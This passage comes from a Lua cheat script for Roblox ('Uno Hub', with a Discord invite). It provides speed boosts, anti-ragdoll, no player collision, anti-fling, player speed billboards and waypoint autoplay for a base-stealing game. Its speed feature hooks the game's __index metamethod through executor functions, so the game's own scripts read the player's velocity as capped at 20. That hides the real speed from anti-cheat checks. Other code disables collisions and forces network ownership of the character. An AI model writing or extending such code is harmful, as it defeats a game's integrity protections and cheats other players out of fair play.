	if now - AntiRagdollV2.ResetCooldown > 0.15 then
	AntiRagdollV2.ResetCooldown = now
	pcall(function()
	hum:ChangeState(Enum.HumanoidStateType.GettingUp)
	root.Velocity = Vector3.zero
	root.RotVelocity = Vector3.zero
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	for _, obj in ipairs(char:GetDescendants()) do
	if obj:IsA("Motor6D") then obj.Enabled = true end
	if obj:IsA("Constraint") then obj.Enabled = true end
	end
	workspace.CurrentCamera.CameraSubject = hum
	local PM = Player.PlayerScripts:FindFirstChild("PlayerModule")
	if PM then
	local CM = require(PM:FindFirstChild("ControlModule"))
	if CM then CM:Enable() end
	end
	hum.AutoRotate = true
	hum.PlatformStand = false
	hum.Sit = false
	end)
	end
	end
	end))
	end

local function stopAntiRagdoll()
	AntiRagdollV2.Enabled = false
	if AntiRagdollV2.Connection then
	AntiRagdollV2.Connection:Disconnect()
	AntiRagdollV2.Connection = nil
	end
end
_G.__UnoTrackStopper(stopAntiRagdoll)
FeaturePostToggle["Anti Ragdoll"] = function(active)
if active then startAntiRagdoll() else stopAntiRagdoll() end
end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(newChar)
	task.wait(0.5)
	if toggleStates["Anti Ragdoll"] then
	if AntiRagdollV2.Connection then
	AntiRagdollV2.Connection:Disconnect()
	AntiRagdollV2.Connection = nil
	end
	startAntiRagdoll()
	end
	end))

if toggleStates["Anti Ragdoll"] then startAntiRagdoll() end

	local function getSelectedStealSpeed()
	if selectedMode == "Lagger" or laggerEnabled then
	return speedValues.LaggerSteal or carrySpeed
	elseif selectedMode == "Desync" then
	return speedValues.DesyncSteal or carrySpeed
	end
	for _, cs in ipairs(customSpeeds) do
	if selectedMode == cs.name then return cs.steal end
	end
	return speedValues.NormalSteal or carrySpeed
	end

	local function shouldUseStealSpeed(isStealing)
	return speedToggled or (isStealing and toggleStates["Auto Carry Speed"])
	end

	do

	local oldSpeedState = _G.__UnoSpeedSpoofState
	if type(oldSpeedState) == "table" then oldSpeedState.enabled = false end
	local s2State = _G.__UnoS2SpeedState
	if type(s2State) ~= "table" then
		s2State = { hooked = false }
		_G.__UnoS2SpeedState = s2State
	end
	s2State.enabled = false
	s2State.root = nil
	s2State.velChecked = setmetatable({}, { __mode = "k" })

	local function setupVelChecked(character)
		s2State.velChecked = setmetatable({}, { __mode = "k" })
		if not character then s2State.root = nil; return nil end
		local root = character:WaitForChild("HumanoidRootPart", 5)
		if root then
			s2State.root = root
			s2State.velChecked[root] = true
		end
		return root
	end

	local function hookVelHRP(root)
		if not root then return end
		s2State.root = root
		s2State.velChecked[root] = true
		if s2State.hooked then return end
		if type(getrawmetatable) ~= "function" or type(setreadonly) ~= "function"
			or type(newcclosure) ~= "function" or type(checkcaller) ~= "function" then return end
		pcall(function()
			local mt = getrawmetatable(game)
			if not mt then return end
			local originalIndex = rawget(mt, "__index")
			if type(originalIndex) ~= "function" and type(originalIndex) ~= "table" then return end
			local replacementIndex = newcclosure(function(self, key)
				local value
				if type(originalIndex) == "function" then value = originalIndex(self, key)
				else value = originalIndex[key] end
				if not checkcaller() and s2State.velChecked[self]
					and (key == "AssemblyLinearVelocity" or key == "Velocity")
					and typeof(value) == "Vector3" and value.Magnitude > 20 then
					return value.Unit * 20
				end
				return value
			end)
			setreadonly(mt, false)
			mt.__index = replacementIndex
			s2State.hooked = true
			setreadonly(mt, true)
		end)
	end

	local function resetSpeedMovement()
		lastMoveDir = Vector3.zero
		s2State.enabled = false
	end
	_G.__UnoResetSpeedDirection = function()
		lastMoveDir = Vector3.zero
		local character = Player.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local root = character and character:FindFirstChild("HumanoidRootPart")
		if humanoid and root and humanoid.MoveDirection.Magnitude <= 0.05 then
			root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
		end
	end
	local isRagdollState = (function(hum)
		if not hum then return true end
		local st = hum:GetState()
		return hum.PlatformStand or st == Enum.HumanoidStateType.Physics
			or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
	end)
	local getTargetSpeed = (function(isStealing)
		if shouldUseStealSpeed(isStealing) then return getSelectedStealSpeed() end
		return getSelectedBoostSpeed()
	end)
	local function stopSpeedBoost()
		if _G.__speedBoostConn then _G.__speedBoostConn:Disconnect(); _G.__speedBoostConn = nil end
		resetSpeedMovement()
	end
	local function applyVelocitySpeed(direction, speed)
		local character = Player.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local root = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not root or humanoid.Health <= 0 then return end
		if type(speed) ~= "number" or speed ~= speed or speed <= 0 or speed == math.huge then return end

		local verticalVelocity = root.AssemblyLinearVelocity.Y
		if _G._ZurichHub_MovementBlocked == true or _G._UnoHub_MovementBlocked == true then
			root.AssemblyLinearVelocity = Vector3.new(0, math.min(verticalVelocity, 0), 0)
			return
		end
		if direction and direction.Magnitude > 0.05 then
			pcall(function()
				if root.SetNetworkOwner then root:SetNetworkOwner(Player) end
			end)
			local unit = direction.Unit
			root.AssemblyLinearVelocity = Vector3.new(unit.X * speed, verticalVelocity, unit.Z * speed)
		else
			root.AssemblyLinearVelocity = Vector3.new(0, verticalVelocity, 0)
		end
	end
	local function startSpeedBoost()
		stopSpeedBoost()
		_G.__speedBoostConn = RunService.RenderStepped:Connect(function()
			if not toggleStates["Speed Boost"] then return end
			local character = Player.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local root = character and character:FindFirstChild("HumanoidRootPart")
			if not humanoid or not root or humanoid.Health <= 0 then return end

			if toggleStates["Autoplay"] or toggleStates["TP Bat"]
				or toggleStates["Aimbot"]
				or _G.dropActive or _G.IsDropping then
				resetSpeedMovement()
				return
			end
			-- Allow speed changes during hit countdown (even while ragdolled)
			if isRagdollState(humanoid) and not _G._UnoHitCountdownActive then
				lastMoveDir = Vector3.zero
				return
			end
			if s2State.root ~= root or not s2State.velChecked[root] then
				lastMoveDir = Vector3.zero
				setupVelChecked(character)
				hookVelHRP(root)
			end
			s2State.enabled = true
			local direction
			if humanoid.MoveDirection.Magnitude > 0 then
				lastMoveDir = humanoid.MoveDirection
				direction = humanoid.MoveDirection
			elseif lastMoveDir.Magnitude > 0 then
				for key in pairs(MOVE_KEYS) do
					if UserInputService:IsKeyDown(key) then
						direction = lastMoveDir
						break
					end
				end
			end
			local selectedSpeed = getTargetSpeed(Player:GetAttribute("Stealing") == true)
			applyVelocitySpeed(direction, tonumber(selectedSpeed) or 16)
		end)
	end
	local function applySpeedBoostNow()
		if not toggleStates["Speed Boost"] then return end
		local character = Player.Character
		local hum = character and character:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 then return end
		if isRagdollState(hum) and not _G._UnoHitCountdownActive then return end
		local direction = hum.MoveDirection.Magnitude > 0.05 and hum.MoveDirection or nil
		applyVelocitySpeed(direction, getTargetSpeed(Player:GetAttribute("Stealing") == true))
	end
	local function refreshSpeedBoost()
		if toggleStates["Speed Boost"] then startSpeedBoost() else stopSpeedBoost() end
	end
	_G.__refreshSpeedBoost = refreshSpeedBoost
	_G.__stopSpeedBoost = stopSpeedBoost
	_G.__UnoTrackStopper(function()
		toggleStates["Speed Boost"] = false
		stopSpeedBoost()
		s2State.root = nil
		_G.__UnoResetSpeedDirection = nil
	end)
	if Player.Character then
		local initialRoot = setupVelChecked(Player.Character)
		hookVelHRP(initialRoot)
	end
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(character)
		task.wait(0.5)
		resetSpeedMovement()
		local root = character:WaitForChild("HumanoidRootPart", 5)
		if root then setupVelChecked(character); hookVelHRP(root) end
		if toggleStates["Speed Boost"] then startSpeedBoost() end
	end))
	_G.__UnoTrackConn(Player.CharacterRemoving:Connect(function()
		stopSpeedBoost()
		s2State.root = nil
		s2State.velChecked = setmetatable({}, { __mode = "k" })
	end))
	FeatureToggles["Speed Boost"] = function()
	if carrySpeedMode == "v2" then

	speedToggled = not speedToggled
	toggleStates["Carry Speed"] = speedToggled

	toggleStates["Speed Boost"] = true
	startSpeedBoost()
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	saveConfig()
	return
	end
	toggleStates["Speed Boost"] = not toggleStates["Speed Boost"]
	if toggleVisualUpdaters["Speed Boost"] then toggleVisualUpdaters["Speed Boost"]() end
	refreshSpeedBoost(); saveConfig()
	end
	FeaturePostToggle["Speed Boost"] = function(active) if active then startSpeedBoost() else stopSpeedBoost() end end

	FeatureToggles["Carry Speed"] = function()
	toggleStates["Carry Speed"] = not toggleStates["Carry Speed"]
	speedToggled = toggleStates["Carry Speed"]

	toggleStates["Speed Boost"] = true
	startSpeedBoost()
	applySpeedBoostNow()
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	saveConfig()
	end
	FeaturePostToggle["Carry Speed"] = function(active)
	speedToggled = active
	if active or carrySpeedMode == "v2" then
	toggleStates["Speed Boost"] = true
	startSpeedBoost()
	applySpeedBoostNow()
	end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end

	local autoCarryStartedBoost = false
	FeaturePostToggle["Auto Carry Speed"] = function(active)
	if active and not toggleStates["Speed Boost"] then
	toggleStates["Speed Boost"] = true
	autoCarryStartedBoost = true
	startSpeedBoost()
	elseif not active and autoCarryStartedBoost then
	toggleStates["Speed Boost"] = false
	autoCarryStartedBoost = false
	stopSpeedBoost()
	end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end

	local sbSetupPending = {}
	local speedLabelCache = setmetatable({}, {__mode = "k"})
	local LOCAL_SPEED_GRADIENT_GUI1 = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 220, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 220, 255)),
	})
	local LOCAL_SPEED_GRADIENT_GUI2 = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(91, 38, 178)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(190, 137, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 72, 246)),
	})

	local function getSpeedThemeGradient(isLocal)
	local curtAccent = _G.__UnoCurtAccent
	if typeof(curtAccent) == "Color3" then
		local bright = curtAccent:Lerp(Color3.fromRGB(255, 255, 255), 0.22)
		local dark = curtAccent:Lerp(Color3.fromRGB(0, 0, 0), 0.24)
		return ColorSequence.new({
			ColorSequenceKeypoint.new(0, bright),
			ColorSequenceKeypoint.new(0.5, curtAccent),
			ColorSequenceKeypoint.new(1, dark),
		})
	end
	if _G.__UnoGuiTheme == "GUI 3" then
	return ColorSequence.new(Color3.fromRGB(255, 45, 45), Color3.fromRGB(190, 15, 25))
	end
	if isLocal then
	return _G.__UnoGuiTheme == "GUI 2" and LOCAL_SPEED_GRADIENT_GUI2 or LOCAL_SPEED_GRADIENT_GUI1
	end
	return ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(230, 230, 230)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200)),
	})
	end
	local setupSpeedBillboard

	local function getPlayerSpeedDisplayText(p)
	local char = p.Character
	if not char then return "0" end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return "0" end
	local velocity = hrp.AssemblyLinearVelocity
	local realSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude
	local displaySpeed = realSpeed < 0.5 and 0 or math.floor(realSpeed + 0.5)
	if p == Player then
	local isStealing = Player:GetAttribute("Stealing") == true
	-- Afișează viteza selectată chiar și când jucătorul stă pe loc.
	displaySpeed = math.floor(getTargetSpeed(isStealing) + 0.5)
	end
	return tostring(displaySpeed)
	end

	local function requestSpeedBillboard(char, isLocal)
	if not char or not char.Parent then return end
	if sbSetupPending[char] then return end
	sbSetupPending[char] = true
	task.spawn(function()
	setupSpeedBillboard(char, isLocal)
	sbSetupPending[char] = nil
	end)
	end

	setupSpeedBillboard = function(char, isLocal)
	task.wait(0.3)
	local head = char:FindFirstChild("Head")
	if not head then return end
	local old = head:FindFirstChild("GreenDuelsBB")
	if old then old:Destroy() end
	local oldUno = head:FindFirstChild("UnoSpeedBill")
	if oldUno then oldUno:Destroy() end
	local oldOverhead = head:FindFirstChild("UnoHubOverhead")
	if oldOverhead then oldOverhead:Destroy() end
	-- Elimină variante vechi care puteau rămâne active la zoom.
	for _, oldName in ipairs({"Green22sBB", "22sSpeedBill", "22sHubOverhead"}) do
		local stale = head:FindFirstChild(oldName)
		if stale then stale:Destroy() end
	end

	local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
	if torso then local oldTorsoBB = torso:FindFirstChild("GreenDuelsBB")
	if oldTorsoBB then oldTorsoBB:Destroy() end end
	local localPlayerGui = isLocal and Player:FindFirstChildOfClass("PlayerGui") or nil
	if localPlayerGui then
		local previousLocalBillboard = localPlayerGui:FindFirstChild("GreenDuelsBB")
		if previousLocalBillboard then previousLocalBillboard:Destroy() end
	end
	local bb = Instance.new("BillboardGui")
	bb.Adornee = head
	bb.Parent = localPlayerGui or head
	bb.Name = "GreenDuelsBB"
	bb:SetAttribute("UnoThemeWorldAccent", true)
	-- Match the fixed-pixel overhead sizing from the reference script.
	bb.Size = isLocal and UDim2.fromOffset(190, 60) or UDim2.fromOffset(130, 42)
	bb.StudsOffset = isLocal and Vector3.new(0, 1.8, 0) or Vector3.new(0, 4.8, 0)
	bb.AlwaysOnTop = true
	bb.LightInfluence = 0
	bb.MaxDistance = 0

	local function applySpeedLabelStyle(lbl, localOnly)
	-- Custom font on overhead (discord + speed) when selected
	local customFont = nil
	pcall(function()
		if _G.UnoFonts and _G.UnoFonts.current then
			customFont = _G.UnoFonts.current()
		end
	end)
	if customFont then
		pcall(function() lbl.FontFace = customFont end)
	else
		lbl.Font = Enum.Font.GothamBlack
	end
	lbl.TextStrokeTransparency = 0
	if localOnly then
	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	local stroke = Instance.new("UIStroke", lbl)
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 1.5
	stroke.Transparency = 0.2
	local grad = Instance.new("UIGradient")
	grad.Name = "SpeedTextGradient"
	grad.Color = getSpeedThemeGradient(true)
	grad.Parent = lbl
	else
	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	local stroke = Instance.new("UIStroke", lbl)
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 2
	stroke.Transparency = 0.1
	local grad = Instance.new("UIGradient")
	grad.Name = "SpeedTextGradient"
	grad.Color = getSpeedThemeGradient(false)
	grad.Parent = lbl
	end
	end

	local discordLbl = Instance.new("TextLabel", bb)
	discordLbl.Name = "DiscordBillLbl"
	discordLbl.Size = UDim2.new(1, 0, 0, isLocal and 28 or 22)
	discordLbl.Position = UDim2.new(0, 0, 0, 0)
	discordLbl.BackgroundTransparency = 1
	discordLbl.Text = isLocal and "discord.gg/hyejuu" or ""
	discordLbl.Visible = isLocal
	discordLbl.TextScaled = false
	discordLbl.TextSize = isLocal and 19 or 15
	applySpeedLabelStyle(discordLbl, isLocal)

	local speedLbl = Instance.new("TextLabel", bb)
	speedLbl.Name = "SpeedBillLbl"
	speedLbl.Size = UDim2.new(1, 0, 0, isLocal and 29 or 20)
	speedLbl.Position = UDim2.new(0, 0, 0, isLocal and 30 or 22)
	speedLbl.BackgroundTransparency = 1
	local owner = Players:GetPlayerFromCharacter(char)
	speedLbl.Text = owner and getPlayerSpeedDisplayText(owner) or "0"
	if owner then speedLabelCache[owner] = speedLbl end
	speedLbl.TextScaled = false
	speedLbl.TextSize = isLocal and 22 or 16
	applySpeedLabelStyle(speedLbl, isLocal)

	-- Register overhead labels with font changer
	pcall(function()
		if _G.UnoFonts and _G.UnoFonts.applyOne then
			local f = _G.UnoFonts.current and _G.UnoFonts.current() or nil
			_G.UnoFonts.applyOne(discordLbl, f)
			_G.UnoFonts.applyOne(speedLbl, f)
		end
	end)

	_G.__UnoRegisterThemeRoot(bb)
	end

	local function setupForPlayer(p)
	if p.Character then requestSpeedBillboard(p.Character, p == Player) end
	_G.__UnoTrackConn(p.CharacterAdded:Connect(function(char) requestSpeedBillboard(char, p == Player) end))
	end

	for _, p in ipairs(Players:GetPlayers()) do
	if p ~= Player then setupForPlayer(p) end
	end
	_G.__UnoTrackConn(Players.PlayerAdded:Connect(function(p) setupForPlayer(p) end))
	if Player.Character then requestSpeedBillboard(Player.Character, true) end
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(char)

	speedToggled = toggleStates["Carry Speed"] == true
	task.spawn(function()
	requestSpeedBillboard(char, true)
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end)
	end))

	local sbLastUpdate = 0

	local sbThrottle = 0.25
	local sbLastText = {}

	_G.__UnoTrackConn(RunService.Heartbeat:Connect((function(dt)
	sbLastUpdate = sbLastUpdate + (dt or 0)
	if sbLastUpdate < sbThrottle then return end
	sbLastUpdate = 0
	for _, p in ipairs(Players:GetPlayers()) do
	local char = p.Character
	if char then
	local sl = speedLabelCache[p]
	if not sl or not sl.Parent then
	speedLabelCache[p] = nil
	requestSpeedBillboard(char, p == Player)
	else
	local newText = getPlayerSpeedDisplayText(p)
	if sbLastText[p.UserId] ~= newText then
	sl.Text = newText
	sbLastText[p.UserId] = newText
	end
	end
	end
	end
	end)))
	_G.__refreshSpeedBillboards = function()
	for _, p in ipairs(Players:GetPlayers()) do
	local char = p.Character
	if not char then continue end
	local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")
	local head = char:FindFirstChild("Head")
	local torso = char:FindFirstChild("UpperTorso") or hrp
	if not hrp and not head then continue end
	local localBillboard = nil
	if p == Player then
	local playerGui = Player:FindFirstChildOfClass("PlayerGui")
	localBillboard = playerGui and playerGui:FindFirstChild("GreenDuelsBB")
	end
	local bb = localBillboard or (head and (head:FindFirstChild("Green22sBB") or head:FindFirstChild("GreenDuelsBB")))
		or (torso and (torso:FindFirstChild("Green22sBB") or torso:FindFirstChild("GreenDuelsBB")))
	if not bb then continue end
	local sl = bb:FindFirstChild("SpeedBillLbl")
	local dl = bb:FindFirstChild("DiscordBillLbl")
	pcall(function()
		if _G.UnoFonts and _G.UnoFonts.applyOne then
			local f = _G.UnoFonts.current and _G.UnoFonts.current() or nil
			if sl then _G.UnoFonts.applyOne(sl, f) end
			if dl then _G.UnoFonts.applyOne(dl, f) end
		end
	end)
	if not sl then continue end
	speedLabelCache[p] = sl
	sl.Text = getPlayerSpeedDisplayText(p)
	do
	local gradientColor = getSpeedThemeGradient(p == Player)
	for _, child in ipairs(bb:GetChildren()) do
	if child:IsA("TextLabel") then
	local gradient = child:FindFirstChild("SpeedTextGradient")
	if gradient then gradient.Color = gradientColor end
	end
	end
	end
	end
	end

	refreshSpeedBoost()

	local autoLeftWaypoints = {
	Vector3.new(-475.86,-7,91.97), Vector3.new(-485.83,-7,97.37),
	Vector3.new(-475.86,-7,91.97), Vector3.new(-476.35,-7,27.88), Vector3.new(-477.09,-7,19.85),
	}
	local autoRightWaypoints = {
	Vector3.new(-475.84,-7,28.81), Vector3.new(-486.04,-7,23.32),
	Vector3.new(-475.51,-7,29.01), Vector3.new(-476.43,-7,91.61), Vector3.new(-476.27,-7,98.86),
	}
	_G.__autoLeftWaypoints = autoLeftWaypoints
	_G.__autoRightWaypoints = autoRightWaypoints

	local autoplayActive = false; local autoplayMode = "none"; local autoplayWPIdx = 1
	local autoplayConn = nil

	_G.__autoplayMode = _G.__autoplayMode or "Full"

	local function getAutoplayModeForMyBase()
	local plots = workspace:FindFirstChild("Plots"); if not plots then return "left" end
	for _, plot in ipairs(plots:GetChildren()) do
	local sign = plot:FindFirstChild("PlotSign"); local yourBase = sign and sign:FindFirstChild("YourBase")
	if yourBase and yourBase.Enabled then
	local target = plot:FindFirstChild("AnimalTarget",true); local refPos = target and target.Position
	if not refPos then local delivery=plot:FindFirstChild("DeliveryHitbox"); refPos=delivery and delivery.Position end
	if refPos then
	if type(autoLeftWaypoints)=="table" and type(autoRightWaypoints)=="table" and autoLeftWaypoints[1] and autoRightWaypoints[1] then
	local leftDist=(refPos-autoLeftWaypoints[1]).Magnitude; local rightDist=(refPos-autoRightWaypoints[1]).Magnitude
	return (leftDist<=rightDist) and "right" or "left"
	end
	end
	do
	local pivotPos = nil
	if typeof(plot.GetPivot) == "function" then
	pcall(function()
	local piv = plot:GetPivot()
	if piv then pivotPos = piv.Position end
	end)
	end
	if pivotPos then
	return (pivotPos.Z>=60) and "right" or "left"
	else
	return (Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character:FindFirstChild("HumanoidRootPart").Position.Z>=60) and "right" or "left"
	end
	end
	end
	end
	return "left"
	end

	;(function()
	if _G.__ZurichSetFullNoPlayerCollision then pcall(_G.__ZurichSetFullNoPlayerCollision, false) end
	local npcEnabled = false
	local npcSuspended = false
	local npcConnections = {}
	local npcOriginalCollisions = setmetatable({}, {__mode = "k"})

	local function autoBatControlsPhysics()
	return toggleStates["TP Bat"] == true
	end

	local function disablePartCollision(part)
	if not part:IsA("BasePart") then return end
	if npcOriginalCollisions[part] == nil then
	npcOriginalCollisions[part] = {
	CanCollide = part.CanCollide,
	CanTouch = part.CanTouch,
	}
	end
	if part.CanCollide then part.CanCollide = false end
	if part.CanTouch then part.CanTouch = false end
	end

	local function disableCharacterCollisions(character)
	if not character then return end
	for _, part in ipairs(character:GetDescendants()) do
	disablePartCollision(part)
	end
	end

	local function watchCharacterCollisions(character)
	if autoBatControlsPhysics() then return end
	disableCharacterCollisions(character)
	table.insert(npcConnections, character.DescendantAdded:Connect(function(part)
	if npcEnabled and not npcSuspended and not autoBatControlsPhysics() then disablePartCollision(part) end
	end))
	end

	local function watchPlayerCollisions(plr)
	if plr == Player then return end
	if plr.Character then watchCharacterCollisions(plr.Character) end
	table.insert(npcConnections, plr.CharacterAdded:Connect(function(character)
	if npcEnabled and not npcSuspended and not autoBatControlsPhysics() then watchCharacterCollisions(character) end
	end))
	end

	local function restoreTrackedCollisions()
	for part, original in pairs(npcOriginalCollisions) do
	if part and part.Parent then
	pcall(function()
	part.CanCollide = original.CanCollide
	part.CanTouch = original.CanTouch
	end)
	end
	end
	npcOriginalCollisions = setmetatable({}, {__mode = "k"})
	end

	local alwaysOnAntiFling = (function()
	if _G.dropActive or _G.IsDropping then return end
	local character = Player.Character
	local root = character and character:FindFirstChild("HumanoidRootPart")
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not root or not humanoid or humanoid.Health <= 0 then return end
	local velocity = root.AssemblyLinearVelocity
	local horizontal = Vector3.new(velocity.X, 0, velocity.Z)
	local angular = root.AssemblyAngularVelocity
	local intentionalMovement = toggleStates["TP Bat"] == true
		or toggleStates["Aimbot"] == true
		or autoplayActive == true
	local flung = horizontal.Magnitude > 375 or math.abs(velocity.Y) > 300 or angular.Magnitude > 110
	if flung and not intentionalMovement then
	for _, part in ipairs(character:GetDescendants()) do
	if part:IsA("BasePart") then
	part.AssemblyLinearVelocity = Vector3.zero
	part.AssemblyAngularVelocity = Vector3.zero
	end
	end
	end
	end)

	local function enableNoPlayerCollision()
	if npcEnabled then return end
	npcEnabled = true
	npcSuspended = autoBatControlsPhysics()

	if not npcSuspended then
	for _, plr in ipairs(Players:GetPlayers()) do watchPlayerCollisions(plr) end
	end
	table.insert(npcConnections, Players.PlayerAdded:Connect(watchPlayerCollisions))

	table.insert(npcConnections, RunService.Stepped:Connect(function()
	if not npcEnabled then return end
	local shouldSuspend = autoBatControlsPhysics()
	if shouldSuspend then
	if not npcSuspended then
	npcSuspended = true
	restoreTrackedCollisions()
	end
	return
	end
	if npcSuspended then npcSuspended = false end
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= Player and plr.Character then
	disableCharacterCollisions(plr.Character)
	end
	end
	end))
	end

	local function disableNoPlayerCollision()
	if not npcEnabled then return end
	npcEnabled = false
	for _, connection in ipairs(npcConnections) do
	pcall(function() connection:Disconnect() end)
	end
	npcConnections = {}
	restoreTrackedCollisions()
	npcSuspended = false
	end

	_G.__ZurichSetFullNoPlayerCollision = function(active)
	if active then enableNoPlayerCollision() else disableNoPlayerCollision() end
	end
	_G.__setNoPlayerCollision = _G.__ZurichSetFullNoPlayerCollision
	_G.__getNoPlayerCollision = function() return npcEnabled end
	_G.__UnoTrackStopper(disableNoPlayerCollision)

_G.__UnoTrackConn(RunService.PostSimulation:Connect(alwaysOnAntiFling))
	enableNoPlayerCollision()
	end)()

	local function killInvisiblePart(part)
	if not part or not part:IsA("BasePart") then return end
	if part.CanCollide and (part.Transparency >= 0.9 or part.LocalTransparencyModifier >= 0.9) then
	part.CanCollide = false
	end
	end
	local function killInvisibleParts(center, radius)
	if not center then return end
	for _, part in ipairs(workspace:GetPartBoundsInRadius(center, radius)) do
	killInvisiblePart(part)
	end
	end
	_G.__killInvisibleNear = killInvisibleParts
	_G.__UnoTrackConn(workspace.DescendantAdded:Connect(function(part)
	if not (toggleStates["ESP Players"] or toggleStates["Player Tracers"] or toggleStates["Stretchz Res"]) then return end
	killInvisiblePart(part)
	end))
	do

	local invisibleCheckAcc = 0
	local invisibleCheckInterval = 2.0
	local invisibleGlobalAcc = 0
	local invisibleGlobalInterval = 15
	local invisibleGlobalScanCancel = nil
	_G.__UnoTrackConn(RunService.Heartbeat:Connect((function(dt)
	local hasVisualsActive = toggleStates["ESP Players"] or toggleStates["Player Tracers"] or toggleStates["Stretchz Res"]
	if not hasVisualsActive then return end
	invisibleCheckAcc = invisibleCheckAcc + (dt or 0)
	invisibleGlobalAcc = invisibleGlobalAcc + (dt or 0)
	if invisibleCheckAcc >= invisibleCheckInterval then
	invisibleCheckAcc = 0
	local char = Player.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if root then
	for _, part in ipairs(char:GetDescendants()) do
	killInvisiblePart(part)
	end
	local rootVelocity = root.AssemblyLinearVelocity
	local velFlat = Vector3.new(rootVelocity.X, 0, rootVelocity.Z)
	local speed = velFlat.Magnitude
	local radius = math.clamp(20 + speed * 0.2, 20, 40)
	killInvisibleParts(root.Position, radius)
	if speed > 5 then killInvisibleParts(root.Position + velFlat * 0.35, radius) end
	end
	end
	if invisibleGlobalAcc >= invisibleGlobalInterval then
	invisibleGlobalAcc = 0
	if invisibleGlobalScanCancel then invisibleGlobalScanCancel() end
	invisibleGlobalScanCancel = _G.__UnoWalkDescendantsBatched(workspace, killInvisiblePart, function()
	return toggleStates["ESP Players"] or toggleStates["Player Tracers"] or toggleStates["Stretchz Res"]
	end)
	end
	end)))
	end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function()
	awfLastRecovery = 0
	end))

	local autoplayEnabledAutoCarry = false
	local function setAutoplayAutoCarry(active)
	if active then
	if toggleStates["Auto Carry Speed"] then return end
	autoplayEnabledAutoCarry = true
	else
	if not autoplayEnabledAutoCarry then return end
	autoplayEnabledAutoCarry = false
	end

	toggleStates["Auto Carry Speed"] = active
	local setter = toggleStateSetters["Auto Carry Speed"]
	if setter then pcall(setter, active) end
	local postToggle = FeaturePostToggle["Auto Carry Speed"]
	if postToggle then pcall(postToggle, active) end
	local visual = toggleVisualUpdaters["Auto Carry Speed"]
	if visual then pcall(visual) end
	end

	local function setAutoplayToggleUI(state)
	toggleStates["Autoplay"] = state
	local setter = toggleStateSetters["Autoplay"]
	if setter then
	pcall(setter, state)
	return
	end
	local visual = toggleVisualUpdaters["Autoplay"]
	if visual then pcall(visual) end
	end

	local function stopAutoplay(keepToggle)
	if autoplayActive then
	autoplayActive = false
	autoplayMode = "none"
	autoplayWPIdx = 1
	if autoplayConn then autoplayConn:Disconnect(); autoplayConn = nil end
	local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
	if hrp then hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0) end
	end
	setAutoplayAutoCarry(false)
	if keepToggle then return end
	if toggleStates["Autoplay"] then
	setAutoplayToggleUI(false)
	saveConfig()
	end
	end
	_G.__stopAutoplay = stopAutoplay
	_G.__UnoTrackStopper(stopAutoplay)

	local function startAutoplay()
	if autoplayActive then stopAutoplay(true) end
	deactivateOtherAimbots()

	if toggleStates["TP Bat"] and _G.UnoAutoBat then _G.UnoAutoBat.SetEnabled(false) end
	local mode=getAutoplayModeForMyBase(); autoplayMode=mode; autoplayWPIdx=1; autoplayActive=true
	setAutoplayAutoCarry(true)

	if not _G.__autoplayMode or (_G.__autoplayMode ~= "Full" and _G.__autoplayMode ~= "Semi") then
	_G.__autoplayMode = "Full"
	end
	if autoplayConn then autoplayConn:Disconnect() end
	autoplayConn = RunService.Heartbeat:Connect((function(dt)
	if not autoplayActive then return end
	setAutoplayAutoCarry(true)
	local waypoints=(autoplayMode=="left") and autoLeftWaypoints or autoRightWaypoints

	local stopIdx = (_G.__autoplayMode == "Semi") and 2 or #waypoints
	local wp=waypoints[autoplayWPIdx]; if not wp then return end
	local char=Player.Character; if not char then return end
	local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
	local myPos=hrp.Position
